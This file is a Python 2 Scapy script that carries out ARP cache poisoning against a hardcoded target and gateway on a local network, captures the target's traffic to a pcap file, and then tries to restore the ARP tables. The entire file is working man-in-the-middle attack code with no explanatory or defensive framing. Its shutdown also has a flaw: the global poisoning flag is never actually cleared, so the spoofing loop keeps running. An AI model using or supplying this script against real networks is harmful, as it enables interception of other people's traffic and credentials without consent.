from scapy.all import *
import os
import sys
import threading

# interface    = "eth0"
# target_ip    = "192.168.1.3"
# gateway_ip   = "192.168.1.1"
# packet_count = 5000

class ARPObj(object):
    """The main class for the ARP Spoofer"""
    def __init__(self, **kwargs):
        super(ARPObj, self).__init__()
        self._arg = kwargs
        
    @property
    def gateway_ip(self):
        return self._arg.get('gateway_ip', None)

    @gateway_ip.setter
    def gateway_ip(self, g_ip):
        self._arg['gateway_ip'] = g_ip

    @gateway_ip.deleter
    def gateway_ip(self):
        del self._arg['gateway_ip'] 

    @property
    def gateway_mac(self):
        return self._arg.get('gateway_mac', None)

    @gateway_mac.setter
    def gateway_mac(self, g_mac):
        self._arg['gateway_mac'] = g_mac

    @gateway_mac.deleter
    def gateway_mac(self):
        del self._arg['gateway_mac'] 

    @property
    def target_ip(self):
        return self._arg.get('target_ip', None)

    @target_ip.setter
    def target_ip(self, t_ip):
        self._arg['target_ip'] = t_ip

    @target_ip.deleter
    def target_ip(self):
        del self._arg['target_ip'] 

    @property
    def target_mac(self):
        return self._arg.get('target_mac', None)

    @target_mac.setter
    def target_mac(self, t_mac):
        self._arg['target_mac'] = t_mac

    @target_mac.deleter
    def target_mac(self):
        del self._arg['target_mac'] 

    
    def restore_target(self):
        
        # slightly different method using send
        print "[*] Restoring target..."
        send(ARP(op=2, psrc=self._arg['gateway_ip'] , pdst=self._arg['target_ip'] , hwdst="ff:ff:ff:ff:ff:ff",hwsrc=self._arg['gateway_mac'] ),count=5)
        send(ARP(op=2, psrc=self._arg['target_ip'] , pdst=self._arg['gateway_ip'] , hwdst="ff:ff:ff:ff:ff:ff",hwsrc=self._arg['target_mac'] ),count=5)
        
    
        
    def poison_target(self):
        global poisoning
       
        poison_target = ARP()
        poison_target.op   = 2
        poison_target.psrc = self._arg['gateway_ip'] 
        poison_target.pdst = self._arg['target_ip'] 
        poison_target.hwdst= self._arg['target_mac'] 

        poison_gateway = ARP()
        poison_gateway.op   = 2
        poison_gateway.psrc = self._arg['target_ip'] 
        poison_gateway.pdst = self._arg['gateway_ip'] 
        poison_gateway.hwdst= self._arg['gateway_mac'] 

        print "[*] Beginning the ARP poison. [CTRL-C to stop]"

        while poisoning:
            send(poison_target)
            send(poison_gateway)
              
            time.sleep(2)
              
        print "[*] ARP poison attack finished."

        return

def get_mac(ip_address):
        
        responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)
        
        # return the MAC address from a response
        for s,r in responses:
            return r[Ether].src
        
        return None

poisoning = True

def main():
    ARP_Obj = ARPObj()
    interface = "eth0" #str(raw_input("Enter the interface: "))
    ARP_Obj.target_ip = "192.168.1.2" #str(raw_input("Enter the target ip: "))
    ARP_Obj.gateway_ip = "192.168.1.1" #str(raw_input("Enter the gateway ip: "))
    packet_count = 5000 #int(raw_input("Enter the packet count: "))

    # set our interface
    conf.iface = interface

    # turn off output
    conf.verb  = 0

    print "[*] Setting up %s" % interface

    ARP_Obj.gateway_mac = get_mac(ARP_Obj.gateway_ip)

    if ARP_Obj.gateway_mac is None:
        print "[!!!] Failed to get gateway MAC. Exiting."
        sys.exit(0)
    else:
        print "[*] Gateway %s is at %s" % (ARP_Obj.gateway_ip,ARP_Obj.gateway_mac)

    ARP_Obj.target_mac = get_mac(ARP_Obj.target_ip)

    if ARP_Obj.target_mac is None:
        print "[!!!] Failed to get target MAC. Exiting."
        sys.exit(0)
    else:
        print "[*] Target %s is at %s" % (ARP_Obj.target_ip, ARP_Obj.target_mac)
        
    # start poison thread
    poison_thread = threading.Thread(target=ARP_Obj.poison_target)
    poison_thread.start()
    #ARP_Obj.poison_target()

    try:
        print "[*] Starting sniffer for %d packets" % packet_count
        
        bpf_filter  = "ip host %s" % ARP_Obj.target_ip
        packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)
        
    except KeyboardInterrupt:
        pass

    finally:
        # write out the captured packets
        print "[*] Writing packets to arper.pcap"
        wrpcap('arper.pcap',packets)

        poisoning = False

        # wait for poisoning thread to exit
        time.sleep(2)

        # restore the network
        ARP_Obj.restore_target()
        sys.exit(0)

if __name__ == '__main__':
    main()